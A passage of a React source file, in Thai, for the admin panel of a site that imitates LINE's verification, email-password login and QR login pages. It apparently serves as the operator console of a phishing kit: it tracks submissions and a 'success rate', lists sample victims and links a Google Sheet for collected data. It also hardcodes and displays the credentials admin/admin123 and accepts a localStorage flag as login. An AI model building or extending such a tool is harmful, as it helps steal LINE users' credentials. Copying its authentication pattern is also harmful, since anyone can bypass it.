import React, { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button.jsx'
import { Input } from '@/components/ui/input.jsx'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card.jsx'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs.jsx'
import { Label } from '@/components/ui/label.jsx'
import { Textarea } from '@/components/ui/textarea.jsx'
import { Settings, Palette, FileText, Database, Eye, LogOut } from 'lucide-react'

function AdminPanel() {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [loginData, setLoginData] = useState({ username: '', password: '' })
  const [config, setConfig] = useState({
    // ข้อความต่างๆ
    texts: {
      verificationTitle: 'รหัสยืนยันตัวตน',
      verificationSubtitle: 'กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย',
      formTitle: 'ชื่อ',
      formSubtitle: 'นามสกุล',
      submitButton: 'ยืนยัน',
      qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
      qrSubtitle: 'โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด',
      backToForm: 'เข้าสู่ระบบด้วยอีเมล',
      howToScan: 'วิธีสแกนคิวอาร์โค้ด'
    },
    // สีธีม
    colors: {
      primary: '#22c55e', // green-500
      secondary: '#6b7280', // gray-500
      background: '#f9fafb', // gray-50
      card: '#ffffff',
      text: '#1f2937' // gray-800
    },
    // การตั้งค่าหน้า
    pages: {
      showVerificationPage: true,
      showEmailLoginPage: true,
      showFormPage: true,
      showQRPage: true,
      pageOrder: ['verification', 'emailLogin', 'form', 'qr']
    },
    // การตั้งค่าอื่นๆ
    settings: {
      verificationCodeLength: 4,
      timerDuration: 180,
      googleSheetsUrl: 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec'
    }
  })
  const [formSubmissions, setFormSubmissions] = useState([])

  // ตรวจสอบการล็อกอิน
  useEffect(() => {
    const savedLogin = localStorage.getItem('adminLoggedIn')
    if (savedLogin === 'true') {
      setIsLoggedIn(true)
    }
  }, [])

  const handleLogin = (e) => {
    e.preventDefault()
    // ตรวจสอบ username และ password (ในการใช้งานจริงควรใช้ระบบที่ปลอดภัยกว่า)
    if (loginData.username === 'admin' && loginData.password === 'admin123') {
      setIsLoggedIn(true)
      localStorage.setItem('adminLoggedIn', 'true')
    } else {
      alert('ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง')
    }
  }

  const handleLogout = () => {
    setIsLoggedIn(false)
    localStorage.removeItem('adminLoggedIn')
    setLoginData({ username: '', password: '' })
  }

  const handleConfigChange = (section, key, value) => {
    setConfig(prev => ({
      ...prev,
      [section]: {
        ...prev[section],
        [key]: value
      }
    }))
    // บันทึกการตั้งค่าใน localStorage
    localStorage.setItem('lineFormConfig', JSON.stringify({
      ...config,
      [section]: {
        ...config[section],
        [key]: value
      }
    }))
  }

  // ฟังก์ชันอัปเดตการตั้งค่าหน้า
  const updatePageSetting = (key, value) => {
    const newConfig = {
      ...config,
      pages: {
        ...config.pages,
        [key]: value
      }
    }
    setConfig(newConfig)
    
    // บันทึกทันทีใน localStorage
    localStorage.setItem('pageSettings', JSON.stringify(newConfig.pages))
    localStorage.setItem('lineFormConfig', JSON.stringify(newConfig))
  }

  // ฟังก์ชันบันทึกการตั้งค่าหน้า
  const savePageSettings = () => {
    localStorage.setItem('pageSettings', JSON.stringify(config.pages))
    localStorage.setItem('lineFormConfig', JSON.stringify(config))
    
    // แจ้งเตือนและรีเฟรชหน้าเว็บหลัก
    alert('บันทึกการตั้งค่าเรียบร้อยแล้ว! การเปลี่ยนแปลงจะมีผลทันที')
    
    // ส่งสัญญาณให้หน้าเว็บหลักอัปเดต
    window.dispatchEvent(new Event('storage'))
  }

  const exportConfig = () => {
    const dataStr = JSON.stringify(config, null, 2)
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr)
    const exportFileDefaultName = 'line-form-config.json'
    
    const linkElement = document.createElement('a')
    linkElement.setAttribute('href', dataUri)
    linkElement.setAttribute('download', exportFileDefaultName)
    linkElement.click()
  }

  const previewWebsite = () => {
    window.open('/', '_blank')
  }

  // หน้าล็อกอิน
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl font-bold text-green-600">
              Admin Panel
            </CardTitle>
            <p className="text-gray-600">เข้าสู่ระบบจัดการ</p>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <Label htmlFor="username">ชื่อผู้ใช้</Label>
                <Input
                  id="username"
                  type="text"
                  value={loginData.username}
                  onChange={(e) => setLoginData(prev => ({ ...prev, username: e.target.value }))}
                  placeholder="admin"
                  required
                />
              </div>
              <div>
                <Label htmlFor="password">รหัสผ่าน</Label>
                <Input
                  id="password"
                  type="password"
                  value={loginData.password}
                  onChange={(e) => setLoginData(prev => ({ ...prev, password: e.target.value }))}
                  placeholder="admin123"
                  required
                />
              </div>
              <Button type="submit" className="w-full bg-green-500 hover:bg-green-600">
                เข้าสู่ระบบ
              </Button>
            </form>
            <div className="mt-4 p-3 bg-blue-50 rounded-lg text-sm text-blue-700">
              <strong>ข้อมูลทดสอบ:</strong><br />
              ชื่อผู้ใช้: admin<br />
              รหัสผ่าน: admin123
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // หน้า Admin Panel หลัก
  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4">
              <h1 className="text-xl font-bold text-gray-900">LINE Form Admin Panel</h1>
            </div>
            <div className="flex items-center space-x-4">
              <Button 
                onClick={previewWebsite}
                variant="outline" 
                size="sm"
                className="flex items-center space-x-2"
              >
                <Eye className="h-4 w-4" />
                <span>ดูตัวอย่าง</span>
              </Button>
              <Button 
                onClick={handleLogout}
                variant="outline" 
                size="sm"
                className="flex items-center space-x-2 text-red-600 hover:text-red-700"
              >
                <LogOut className="h-4 w-4" />
                <span>ออกจากระบบ</span>
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">        <Tabs defaultValue="dashboard" className="w-full">
          <TabsList className="grid w-full grid-cols-5">
            <TabsTrigger value="dashboard" className="flex items-center space-x-2">
              <Settings className="w-4 h-4" />
              <span>Dashboard</span>
            </TabsTrigger>
            <TabsTrigger value="content" className="flex items-center space-x-2">
              <FileText className="w-4 h-4" />
              <span>แก้ไขเนื้อหา</span>
            </TabsTrigger>
            <TabsTrigger value="theme" className="flex items-center space-x-2">
              <Palette className="w-4 h-4" />
              <span>ธีมและสี</span>
            </TabsTrigger>
            <TabsTrigger value="data" className="flex items-center space-x-2">
              <Database className="w-4 h-4" />
              <span>ข้อมูลฟอร์ม</span>
            </TabsTrigger>
            <TabsTrigger value="settings" className="flex items-center space-x-2">
              <Eye className="w-4 h-4" />
              <span>จัดการหน้า</span>
            </TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>สถิติการใช้งาน</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-3xl font-bold text-green-600">0</div>
                  <p className="text-gray-600">ฟอร์มที่ส่งวันนี้</p>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader>
                  <CardTitle>ฟอร์มทั้งหมด</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-3xl font-bold text-blue-600">{formSubmissions.length}</div>
                  <p className="text-gray-600">ฟอร์มที่ส่งทั้งหมด</p>
                </CardContent>
              </Card>
              
              <Card>
                <CardHeader>
                  <CardTitle>สถานะระบบ</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-lg font-semibold text-green-600">ออนไลน์</div>
                  <p className="text-gray-600">ระบบทำงานปกติ</p>
                </CardContent>
              </Card>
            </div>

            <Card>
              <CardHeader>
                <CardTitle>การดำเนินการด่วน</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                  <Button 
                    onClick={() => window.open('/', '_blank')}
                    className="bg-green-500 hover:bg-green-600 h-16 flex flex-col items-center justify-center"
                  >
                    <div className="text-lg mb-1">🏠</div>
                    <span className="text-sm">หน้าหลัก</span>
                  </Button>
                  
                  <Button 
                    onClick={() => window.open('/?step=2', '_blank')}
                    variant="outline"
                    className="h-16 flex flex-col items-center justify-center"
                  >
                    <div className="text-lg mb-1">📧</div>
                    <span className="text-sm">หน้าอีเมล</span>
                  </Button>
                  
                  <Button 
                    onClick={() => window.open('/?step=3', '_blank')}
                    variant="outline"
                    className="h-16 flex flex-col items-center justify-center"
                  >
                    <div className="text-lg mb-1">📝</div>
                    <span className="text-sm">หน้าฟอร์ม</span>
                  </Button>
                  
                  <Button 
                    onClick={() => window.open('/?step=4', '_blank')}
                    variant="outline"
                    className="h-16 flex flex-col items-center justify-center"
                  >
                    <div className="text-lg mb-1">📱</div>
                    <span className="text-sm">QR Code</span>
                  </Button>
                </div>
                
                <div className="flex flex-wrap gap-2">
                  <Button onClick={previewWebsite} className="bg-blue-500 hover:bg-blue-600">
                    ดูตัวอย่างเว็บไซต์
                  </Button>
                  <Button onClick={exportConfig} variant="outline">
                    ดาวน์โหลดการตั้งค่า
                  </Button>
                  <Button 
                    onClick={() => window.open('https://github.com/yo55555/line-form-website', '_blank')}
                    variant="outline"
                  >
                    GitHub Repository
                  </Button>
                  <Button 
                    onClick={() => {
                      const url = window.location.origin + window.location.pathname.replace('/admin', '')
                      navigator.clipboard.writeText(url)
                      alert('คัดลอกลิงก์เว็บไซต์แล้ว!')
                    }}
                    variant="outline"
                  >
                    คัดลอกลิงก์
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Content Tab - แก้ไขเนื้อหา */}
          <TabsContent value="content" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>แก้ไขเนื้อหา</CardTitle>
                <p className="text-gray-600">ปรับแต่งข้อความต่างๆ ในเว็บไซต์</p>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* หน้ารหัสยืนยัน */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้ารหัสยืนยันตัวตน</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="verificationTitle">หัวข้อหลัก</Label>
                      <Input
                        id="verificationTitle"
                        value={config.texts.verificationTitle}
                        onChange={(e) => handleConfigChange('texts', 'verificationTitle', e.target.value)}
                        placeholder="รหัสยืนยันตัวตน"
                      />
                    </div>
                    <div>
                      <Label htmlFor="verificationSubtitle">คำอธิบาย</Label>
                      <Textarea
                        id="verificationSubtitle"
                        value={config.texts.verificationSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'verificationSubtitle', e.target.value)}
                        placeholder="กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย"
                        rows={3}
                      />
                    </div>
                  </div>
                </div>

                {/* หน้าฟอร์ม */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้าฟอร์มกรอกข้อมูล</h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                      <Label htmlFor="formTitle">ป้ายชื่อ</Label>
                      <Input
                        id="formTitle"
                        value={config.texts.formTitle}
                        onChange={(e) => handleConfigChange('texts', 'formTitle', e.target.value)}
                        placeholder="ชื่อ"
                      />
                    </div>
                    <div>
                      <Label htmlFor="formSubtitle">ป้ายนามสกุล</Label>
                      <Input
                        id="formSubtitle"
                        value={config.texts.formSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'formSubtitle', e.target.value)}
                        placeholder="นามสกุล"
                      />
                    </div>
                    <div>
                      <Label htmlFor="submitButton">ปุ่มยืนยัน</Label>
                      <Input
                        id="submitButton"
                        value={config.texts.submitButton}
                        onChange={(e) => handleConfigChange('texts', 'submitButton', e.target.value)}
                        placeholder="ยืนยัน"
                      />
                    </div>
                  </div>
                </div>

                {/* หน้า QR Code */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้า QR Code</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="qrTitle">หัวข้อหลัก</Label>
                      <Input
                        id="qrTitle"
                        value={config.texts.qrTitle}
                        onChange={(e) => handleConfigChange('texts', 'qrTitle', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยคิวอาร์โค้ด"
                      />
                    </div>
                    <div>
                      <Label htmlFor="qrSubtitle">คำอธิบาย</Label>
                      <Textarea
                        id="qrSubtitle"
                        value={config.texts.qrSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'qrSubtitle', e.target.value)}
                        placeholder="โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด"
                        rows={3}
                      />
                    </div>
                    <div>
                      <Label htmlFor="backToForm">ปุ่มกลับ</Label>
                      <Input
                        id="backToForm"
                        value={config.texts.backToForm}
                        onChange={(e) => handleConfigChange('texts', 'backToForm', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยอีเมล"
                      />
                    </div>
                    <div>
                      <Label htmlFor="howToScan">ลิงก์วิธีใช้</Label>
                      <Input
                        id="howToScan"
                        value={config.texts.howToScan}
                        onChange={(e) => handleConfigChange('texts', 'howToScan', e.target.value)}
                        placeholder="วิธีสแกนคิวอาร์โค้ด"
                      />
                    </div>
                  </div>
                </div>

                {/* ปุ่มบันทึก */}
                <div className="flex space-x-4">
                  <Button 
                    onClick={() => {
                      alert('บันทึกการตั้งค่าเรียบร้อย!')
                      // ในการใช้งานจริงจะส่งข้อมูลไปอัปเดตเว็บไซต์
                    }}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    บันทึกการเปลี่ยนแปลง
                  </Button>
                  <Button 
                    onClick={previewWebsite}
                    variant="outline"
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Theme Tab - จัดการสีและธีม */}
          <TabsContent value="theme" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>ธีมและสี</CardTitle>
                <p className="text-gray-600">ปรับแต่งสีและธีมของเว็บไซต์</p>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* สีหลัก */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">สีหลัก</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    <div>
                      <Label htmlFor="primaryColor">สีหลัก (Primary)</Label>
                      <div className="flex items-center space-x-2">
                        <Input
                          id="primaryColor"
                          type="color"
                          value={config.colors.primary}
                          onChange={(e) => handleConfigChange('colors', 'primary', e.target.value)}
                          className="w-16 h-10"
                        />
                        <Input
                          value={config.colors.primary}
                          onChange={(e) => handleConfigChange('colors', 'primary', e.target.value)}
                          placeholder="#22c55e"
                          className="flex-1"
                        />
                      </div>
                    </div>
                    <div>
                      <Label htmlFor="secondaryColor">สีรอง (Secondary)</Label>
                      <div className="flex items-center space-x-2">
                        <Input
                          id="secondaryColor"
                          type="color"
                          value={config.colors.secondary}
                          onChange={(e) => handleConfigChange('colors', 'secondary', e.target.value)}
                          className="w-16 h-10"
                        />
                        <Input
                          value={config.colors.secondary}
                          onChange={(e) => handleConfigChange('colors', 'secondary', e.target.value)}
                          placeholder="#6b7280"
                          className="flex-1"
                        />
                      </div>
                    </div>
                    <div>
                      <Label htmlFor="backgroundColor">สีพื้นหลัง</Label>
                      <div className="flex items-center space-x-2">
                        <Input
                          id="backgroundColor"
                          type="color"
                          value={config.colors.background}
                          onChange={(e) => handleConfigChange('colors', 'background', e.target.value)}
                          className="w-16 h-10"
                        />
                        <Input
                          value={config.colors.background}
                          onChange={(e) => handleConfigChange('colors', 'background', e.target.value)}
                          placeholder="#f9fafb"
                          className="flex-1"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* ธีมสำเร็จรูป */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ธีมสำเร็จรูป</h3>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <Button
                      variant="outline"
                      className="h-20 flex flex-col items-center justify-center space-y-2"
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#22c55e')
                        handleConfigChange('colors', 'secondary', '#6b7280')
                        handleConfigChange('colors', 'background', '#f9fafb')
                      }}
                    >
                      <div className="flex space-x-1">
                        <div className="w-4 h-4 bg-green-500 rounded"></div>
                        <div className="w-4 h-4 bg-gray-500 rounded"></div>
                        <div className="w-4 h-4 bg-gray-50 rounded border"></div>
                      </div>
                      <span className="text-xs">LINE เขียว</span>
                    </Button>
                    
                    <Button
                      variant="outline"
                      className="h-20 flex flex-col items-center justify-center space-y-2"
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#3b82f6')
                        handleConfigChange('colors', 'secondary', '#64748b')
                        handleConfigChange('colors', 'background', '#f1f5f9')
                      }}
                    >
                      <div className="flex space-x-1">
                        <div className="w-4 h-4 bg-blue-500 rounded"></div>
                        <div className="w-4 h-4 bg-slate-500 rounded"></div>
                        <div className="w-4 h-4 bg-slate-100 rounded border"></div>
                      </div>
                      <span className="text-xs">น้ำเงิน</span>
                    </Button>
                    
                    <Button
                      variant="outline"
                      className="h-20 flex flex-col items-center justify-center space-y-2"
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#dc2626')
                        handleConfigChange('colors', 'secondary', '#6b7280')
                        handleConfigChange('colors', 'background', '#fef2f2')
                      }}
                    >
                      <div className="flex space-x-1">
                        <div className="w-4 h-4 bg-red-600 rounded"></div>
                        <div className="w-4 h-4 bg-gray-500 rounded"></div>
                        <div className="w-4 h-4 bg-red-50 rounded border"></div>
                      </div>
                      <span className="text-xs">แดง</span>
                    </Button>
                    
                    <Button
                      variant="outline"
                      className="h-20 flex flex-col items-center justify-center space-y-2"
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#7c3aed')
                        handleConfigChange('colors', 'secondary', '#6b7280')
                        handleConfigChange('colors', 'background', '#faf5ff')
                      }}
                    >
                      <div className="flex space-x-1">
                        <div className="w-4 h-4 bg-violet-600 rounded"></div>
                        <div className="w-4 h-4 bg-gray-500 rounded"></div>
                        <div className="w-4 h-4 bg-violet-50 rounded border"></div>
                      </div>
                      <span className="text-xs">ม่วง</span>
                    </Button>
                  </div>
                </div>

                {/* ตัวอย่างสี */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ตัวอย่าง</h3>
                  <div className="p-6 rounded-lg border" style={{ backgroundColor: config.colors.background }}>
                    <div className="bg-white p-4 rounded-lg shadow-sm max-w-md mx-auto">
                      <h4 className="text-lg font-semibold mb-2" style={{ color: config.colors.primary }}>
                        LINE
                      </h4>
                      <h5 className="font-medium mb-2" style={{ color: config.colors.text }}>
                        รหัสยืนยันตัวตน
                      </h5>
                      <p className="text-sm mb-4" style={{ color: config.colors.secondary }}>
                        กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย
                      </p>
                      <div className="text-center">
                        <div className="text-2xl font-bold mb-2" style={{ color: config.colors.primary }}>
                          5272
                        </div>
                        <Button 
                          className="w-full"
                          style={{ 
                            backgroundColor: config.colors.primary,
                            borderColor: config.colors.primary 
                          }}
                        >
                          เข้าสู่ระบบด้วยรหัสยืนยัน
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>

                {/* ปุ่มบันทึก */}
                <div className="flex space-x-4">
                  <Button 
                    onClick={() => {
                      alert('บันทึกธีมเรียบร้อย!')
                    }}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    บันทึกธีม
                  </Button>
                  <Button 
                    onClick={previewWebsite}
                    variant="outline"
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Data Tab - ดูข้อมูลฟอร์ม */}
          <TabsContent value="data" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>ข้อมูลฟอร์ม</CardTitle>
                <p className="text-gray-600">ดูข้อมูลที่ส่งมาจากฟอร์ม</p>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* สถิติ */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Card>
                    <CardContent className="p-4">
                      <div className="text-2xl font-bold text-blue-600">127</div>
                      <p className="text-sm text-gray-600">ผู้ใช้ทั้งหมด</p>
                    </CardContent>
                  </Card>
                  <Card>
                    <CardContent className="p-4">
                      <div className="text-2xl font-bold text-green-600">23</div>
                      <p className="text-sm text-gray-600">วันนี้</p>
                    </CardContent>
                  </Card>
                  <Card>
                    <CardContent className="p-4">
                      <div className="text-2xl font-bold text-purple-600">89%</div>
                      <p className="text-sm text-gray-600">อัตราสำเร็จ</p>
                    </CardContent>
                  </Card>
                </div>

                {/* ตารางข้อมูล */}
                <div className="space-y-4">
                  <div className="flex justify-between items-center">
                    <h3 className="text-lg font-semibold">รายการข้อมูล</h3>
                    <div className="flex space-x-2">
                      <Button variant="outline" size="sm">
                        ส่งออก CSV
                      </Button>
                      <Button variant="outline" size="sm">
                        รีเฟรช
                      </Button>
                    </div>
                  </div>
                  
                  <div className="border rounded-lg overflow-hidden">
                    <table className="w-full">
                      <thead className="bg-gray-50">
                        <tr>
                          <th className="px-4 py-3 text-left text-sm font-medium text-gray-900">วันที่</th>
                          <th className="px-4 py-3 text-left text-sm font-medium text-gray-900">เวลา</th>
                          <th className="px-4 py-3 text-left text-sm font-medium text-gray-900">ชื่อ</th>
                          <th className="px-4 py-3 text-left text-sm font-medium text-gray-900">นามสกุล</th>
                          <th className="px-4 py-3 text-left text-sm font-medium text-gray-900">สถานะ</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-200">
                        <tr>
                          <td className="px-4 py-3 text-sm text-gray-900">08/09/2025</td>
                          <td className="px-4 py-3 text-sm text-gray-900">16:23:45</td>
                          <td className="px-4 py-3 text-sm text-gray-900">สมชาย</td>
                          <td className="px-4 py-3 text-sm text-gray-900">ใจดี</td>
                          <td className="px-4 py-3">
                            <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">
                              สำเร็จ
                            </span>
                          </td>
                        </tr>
                        <tr>
                          <td className="px-4 py-3 text-sm text-gray-900">08/09/2025</td>
                          <td className="px-4 py-3 text-sm text-gray-900">15:45:12</td>
                          <td className="px-4 py-3 text-sm text-gray-900">สมหญิง</td>
                          <td className="px-4 py-3 text-sm text-gray-900">รักดี</td>
                          <td className="px-4 py-3">
                            <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">
                              สำเร็จ
                            </span>
                          </td>
                        </tr>
                        <tr>
                          <td className="px-4 py-3 text-sm text-gray-900">08/09/2025</td>
                          <td className="px-4 py-3 text-sm text-gray-900">14:32:08</td>
                          <td className="px-4 py-3 text-sm text-gray-900">สมศรี</td>
                          <td className="px-4 py-3 text-sm text-gray-900">มีสุข</td>
                          <td className="px-4 py-3">
                            <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-yellow-100 text-yellow-800">
                              รอดำเนินการ
                            </span>
                          </td>
                        </tr>
                        <tr>
                          <td className="px-4 py-3 text-sm text-gray-900">08/09/2025</td>
                          <td className="px-4 py-3 text-sm text-gray-900">13:15:33</td>
                          <td className="px-4 py-3 text-sm text-gray-900">สมปอง</td>
                          <td className="px-4 py-3 text-sm text-gray-900">ใสใจ</td>
                          <td className="px-4 py-3">
                            <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">
                              สำเร็จ
                            </span>
                          </td>
                        </tr>
                        <tr>
                          <td className="px-4 py-3 text-sm text-gray-900">08/09/2025</td>
                          <td className="px-4 py-3 text-sm text-gray-900">12:08:17</td>
                          <td className="px-4 py-3 text-sm text-gray-900">สมหมาย</td>
                          <td className="px-4 py-3 text-sm text-gray-900">ดีงาม</td>
                          <td className="px-4 py-3">
                            <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-red-100 text-red-800">
                              ล้มเหลว
                            </span>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  
                  {/* Pagination */}
                  <div className="flex items-center justify-between">
                    <p className="text-sm text-gray-700">
                      แสดง <span className="font-medium">1</span> ถึง <span className="font-medium">5</span> จาก <span className="font-medium">127</span> รายการ
                    </p>
                    <div className="flex space-x-2">
                      <Button variant="outline" size="sm" disabled>
                        ก่อนหน้า
                      </Button>
                      <Button variant="outline" size="sm" className="bg-blue-50">
                        1
                      </Button>
                      <Button variant="outline" size="sm">
                        2
                      </Button>
                      <Button variant="outline" size="sm">
                        3
                      </Button>
                      <Button variant="outline" size="sm">
                        ถัดไป
                      </Button>
                    </div>
                  </div>
                </div>

                {/* การตั้งค่า Google Sheets */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">การเชื่อมต่อ Google Sheets</h3>
                  <Card>
                    <CardContent className="p-4">
                      <div className="flex items-center justify-between">
                        <div>
                          <p className="font-medium">สถานะการเชื่อมต่อ</p>
                          <p className="text-sm text-gray-600">เชื่อมต่อกับ Google Sheets สำหรับเก็บข้อมูล</p>
                        </div>
                        <div className="flex items-center space-x-2">
                          <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                          <span className="text-sm text-green-600">เชื่อมต่อแล้ว</span>
                        </div>
                      </div>
                      <div className="mt-4">
                        <Label htmlFor="sheetsUrl">URL ของ Google Sheets</Label>
                        <Input
                          id="sheetsUrl"
                          value="https://docs.google.com/spreadsheets/d/1TyKuO3tCq7HLfKnVoJdXHEGfHTOF1YdprPIHNWutchk/edit"
                          className="mt-1"
                          readOnly
                        />
                      </div>
                      <div className="mt-4 flex space-x-2">
                        <Button variant="outline" size="sm">
                          ทดสอบการเชื่อมต่อ
                        </Button>
                        <Button variant="outline" size="sm">
                          เปิด Google Sheets
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Settings Tab - จัดการหน้า */}
          <TabsContent value="settings" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>จัดการหน้า</CardTitle>
                <p className="text-gray-600">เปิด/ปิดหน้าต่างๆ และจัดลำดับการแสดงผล</p>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* การเปิด/ปิดหน้า */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้าที่จะแสดง</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <Card>
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="font-medium">หน้ารหัสยืนยันตัวตน</h4>
                            <p className="text-sm text-gray-600">แสดงรหัส 4 หลักพร้อมตัวนับเวลา</p>
                          </div>
                          <label className="relative inline-flex items-center cursor-pointer">
                            <input 
                              type="checkbox" 
                              className="sr-only peer" 
                              defaultChecked={true}
                              onChange={(e) => updatePageSetting('showVerificationPage', e.target.checked)}
                            />
                            <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                          </label>
                        </div>
                      </CardContent>
                    </Card>

                    <Card>
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="font-medium">หน้าล็อกอินด้วยอีเมล</h4>
                            <p className="text-sm text-gray-600">ฟอร์มกรอกอีเมลและรหัสผ่าน</p>
                          </div>
                          <label className="relative inline-flex items-center cursor-pointer">
                            <input 
                              type="checkbox" 
                              className="sr-only peer" 
                              defaultChecked={true}
                              onChange={(e) => updatePageSetting('showEmailLoginPage', e.target.checked)}
                            />
                            <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                          </label>
                        </div>
                      </CardContent>
                    </Card>

                    <Card>
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="font-medium">หน้าฟอร์มข้อมูล</h4>
                            <p className="text-sm text-gray-600">ฟอร์มกรอกชื่อ-นามสกุล</p>
                          </div>
                          <label className="relative inline-flex items-center cursor-pointer">
                            <input 
                              type="checkbox" 
                              className="sr-only peer" 
                              defaultChecked={true}
                              onChange={(e) => updatePageSetting('showFormPage', e.target.checked)}
                            />
                            <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                          </label>
                        </div>
                      </CardContent>
                    </Card>

                    <Card>
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div>
                            <h4 className="font-medium">หน้า QR Code</h4>
